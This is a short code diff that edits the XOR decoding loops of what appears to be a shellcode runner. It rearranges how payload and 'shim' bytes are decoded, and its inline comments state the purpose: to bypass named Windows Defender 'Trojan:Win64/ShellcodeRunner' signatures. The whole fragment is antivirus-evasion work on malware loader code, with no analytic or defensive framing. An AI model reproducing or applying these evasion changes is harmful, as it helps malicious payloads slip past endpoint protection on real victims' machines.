@@ -97,8 +97,9 @@ int deC(unsigned char payload[])
     key = keySigBypass();
     for (int i = 0; i < payload_len; i++)
     {
+        unsigned char byte = payload[i] ^ (int)key[i % key.length()]; // Bypass WD "Trojan:Win64/ShellcodeRunner.CL!MTB" signature
         Sleep(0); // Bypass WD "Trojan:Win64/ShellcodeRunner.AMMA!MTB" signature
-        decoded[i] = payload[i] ^ (int)key[i % key.length()];
+        decoded[i] = byte;
     }
     key.clear();
     return 0;
@@ -2077,8 +2078,9 @@ int decodeShim(unsigned char encodedShim[], SIZE_T size)
     key = keySigBypass2();
     for (int i = 0; i < size; i++)
     {
+        unsigned char byte = encodedShim[i] ^ (int)key[i % key.length()]; // Bypass WD "Trojan:Win64/ShellcodeRunner.CL!MTB" signature
         Sleep(0); // Bypass WD "Trojan:Win64/ShellcodeRunner.AMMA!MTB" signature
-        decodedShim[i] = encodedShim[i] ^ (int)key[i % key.length()];
+        decodedShim[i] = byte;
     }
     key.clear();
     return 0;
